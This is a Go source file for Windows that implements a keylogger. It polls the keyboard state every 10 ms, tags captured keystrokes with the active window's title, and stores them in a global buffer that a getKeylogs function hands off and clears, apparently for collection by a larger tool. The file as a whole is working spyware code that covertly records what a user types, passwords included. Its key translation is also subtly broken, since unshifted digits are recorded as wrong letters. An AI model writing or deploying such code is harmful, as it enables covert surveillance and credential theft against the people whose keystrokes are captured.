//go:build windows

package windows

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	procGetKeyState         = user32.NewProc("GetKeyState")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
)

const (
	VK_CAPITAL = 0x14
)

var keylogBuffer string

func startKeylogger() {
	var lastWindow string

	for {
		time.Sleep(10 * time.Millisecond) // Reduce CPU usage

		// Get active window title
		hwnd := getForegroundWindow()
		windowTitle := getWindowText(hwnd)

		if windowTitle != lastWindow {
			keylogBuffer += fmt.Sprintf("\n\n[ Window: %s ]\n", windowTitle)
			lastWindow = windowTitle
		}

		for key := 1; key <= 254; key++ {
			ret, _, _ := procGetAsyncKeyState.Call(uintptr(key))
			if ret&0x8001 == 0x8001 { // Key is pressed
				keylogBuffer += keyToString(key)
			}
		}
	}
}

func getKeylogs() string {
	logs := keylogBuffer
	keylogBuffer = ""
	return logs
}

func getForegroundWindow() uintptr {
	ret, _, _ := procGetForegroundWindow.Call()
	return ret
}

func getWindowText(hwnd uintptr) string {
	var buffer [256]uint16
	_, _, _ = procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buffer[0])), uintptr(len(buffer)))
	return syscall.UTF16ToString(buffer[:])
}

func isCapsLockOn() bool {
	ret, _, _ := procGetKeyState.Call(uintptr(VK_CAPITAL))
	return ret&0x0001 != 0
}

func keyToString(key int) string {
	isShiftRet, _, _ := procGetAsyncKeyState.Call(0x10)
	isShift := (isShiftRet & 0x8000) != 0
	isCaps := isCapsLockOn()
	isCtrlRet, _, _ := procGetAsyncKeyState.Call(0x11)
	isCtrl := (isCtrlRet & 0x8000) != 0

	if isCtrl {
		return "" // Ignore ctrl combinations for now
	}

	switch key {
	case 0x08:
		return "[BS]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "\n"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	case 0x2E:
		return "[DEL]"
	case 0x25:
		return "[LEFT]"
	case 0x26:
		return "[UP]"
	case 0x27:
		return "[RIGHT]"
	case 0x28:
		return "[DOWN]"
	}

	// For printable characters
	if key >= 0x30 && key <= 0x5A {
		isLetter := key >= 0x41 && key <= 0x5A
		char := byte(key)

		if isLetter && isCaps != isShift {
			// Uppercase
		} else {
			// Lowercase
			char += 32
		}

		// Handle numbers and symbols with Shift
		if !isLetter && isShift {
			switch key {
			case 0x30:
				char = ')'
			case 0x31:
				char = '!'
			case 0x32:
				char = '@'
			case 0x33:
				char = '#'
			case 0x34:
				char = '$'
			case 0x35:
				char = '%'
			case 0x36:
				char = '^'
			case 0x37:
				char = '&'
			case 0x38:
				char = '*'
			case 0x39:
				char = '('
			}
		}
		return string(char)
	}

	return "" // Ignore other keys for now
}
